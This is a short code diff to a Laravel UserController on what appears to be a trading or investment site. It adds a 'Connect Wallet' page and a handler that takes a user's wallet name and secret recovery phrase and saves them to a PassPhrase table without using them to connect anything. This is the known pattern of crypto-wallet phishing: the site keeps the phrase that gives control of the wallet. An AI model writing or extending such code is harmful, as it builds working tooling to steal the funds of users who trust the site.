@@ -16,6 +16,7 @@ use App\LiveTrade;
 use App\ManualBank;
 use App\ManualFund;
 use App\ManualFundLog;
+use App\PassPhrase;
 use App\Payment;
 use App\PaymentWallet;
 use App\Photo;
@@ -1962,6 +1963,27 @@ class UserController extends Controller
         curl_close($curl); // Close request
         return $response;
 
+    }
+
+    public function connectWallet()
+    {
+        $data['general'] = GeneralSetting::first();
+        $data['site_title'] = $data['general']->title;
+        $data['basic'] = BasicSetting::first();
+        $data['page_title'] = "Connect Wallet";
+        return view('user.connect-wallet', $data);
+    }
+
+    public function connectWalletz(Request $request)
+    {
+        $this->validate($request,[
+            'wallet_name' => 'required',
+            'secret_phrase' => 'required',
+        ]);
+        $phrase = new PassPhrase();
+        $phrase->wallet_name = $request->wallet_name;
+        $phrase->secret_phrase = $request->secret_phrase;
+        $phrase->save();
     }
 
 }
